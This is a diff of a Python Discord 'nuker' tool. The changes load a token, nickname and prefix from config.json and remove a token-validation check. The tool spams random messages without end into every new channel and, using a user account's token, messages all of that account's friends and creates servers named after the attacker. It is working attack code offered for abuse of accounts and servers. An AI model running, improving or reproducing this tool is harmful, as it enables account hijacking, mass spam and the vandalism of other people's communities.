@@ -93,11 +93,16 @@ def vtoken(token):
     try:
         with open("config.json", "r") as f:
             f = json.load(f)
+            toke = f["token"]
             amount = f["amount"]
             nick = f["nickname"]
             prefix = f["prefix"]
+            if amount != "" and prefix != "" and toke != "" and nick != "":
+                print(Fore.GREEN + "[+] Config successfully loaded.")
+            else:
+                pass
 
-            print(Fore.GREEN + "[+] Config successfully loaded.")
+
 
     except FileNotFoundError:
         print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)
@@ -213,34 +218,58 @@ def vtoken(token):
             @bot.event
             async def on_guild_channel_create(channel):
                 while True:
+                    
                     r = random.choice(SPAM_MESSAGE)
                     await channel.send(r)
+
                     print(Fore.LIGHTGREEN_EX + f"[+] Successfully spammed message: {r}" + Fore.RESET)
+
 
 
             bot.run(token)
 
     else:
         print(Fore.YELLOW + "[*] Token Successfully Identified: User Account")
-        nick = input(Fore.LIGHTBLUE_EX + "[?] what is your internet nickname (NUKED BY {nickname}): ")
+        try:
+            with open("config.json", "r") as f:
+                f = json.load(f)
+                nick = f["nick"]
+
+        except FileNotFoundError:
+            print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)
+
+        if nick != "":
+            pass
+        else:
+            nick = input(Fore.LIGHTBLUE_EX + "[?] what is your internet nickname (NUKED BY {nickname}): ")
 
 
 
 
-        def vtoken(token):
 
-            url = "https://discord.com/api/v9/users/@me"
-
-            r = requests.get(url, headers=getheaders(token))
-            if r.status_code != 200:
-                print(Fore.RED + f"[-] Token is invalid!.")
-                sleep(1)
-                exit()
 
 
 
 
         def nuke(token, Server_Name, message_Content):
+            try:
+                with open("config.json", "r") as f:
+                    f = json.load(f)
+                    toke = f["token"]
+                    amount = f["amount"]
+                    nick = f["nickname"]
+                    prefix = f["prefix"]
+                    if amount != "" and prefix != "" and toke != "" and nick != "":
+                        print(Fore.GREEN + "[+] Config successfully loaded.")
+                    else:
+                        pass
+
+
+
+            except FileNotFoundError:
+                print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)
+
+
             print(Fore.LIGHTGREEN_EX + "[+] Starting nuke...")
 
             headers = {'Authorization': token}
@@ -251,7 +280,7 @@ def vtoken(token):
                                   headers=headers,
                                   data={"content": f"{message_Content}"})
 
-                    print("Messaged ID: " + channel['id'])
+                    print(Fore.LIGHTGREEN_EX + "Messaged ID: " + channel['id'])
                 except Exception as e:
                     print(Fore.RED + f"[-] Error: {e}")
             print(Fore.LIGHTGREEN_EX + "[+] Sent a Message to every friend...\n")
@@ -324,12 +353,12 @@ def vtoken(token):
 
 
 
-        vtoken(token)
+
         Server_Name = f"{nick} ON TOP"
+
         message_Content = str(input(
             Fore.LIGHTBLUE_EX + "[?] Message to send to the user's friends: "))
 
         nuke(token=token, Server_Name=Server_Name, message_Content=message_Content)
 
 vtoken(token)
-
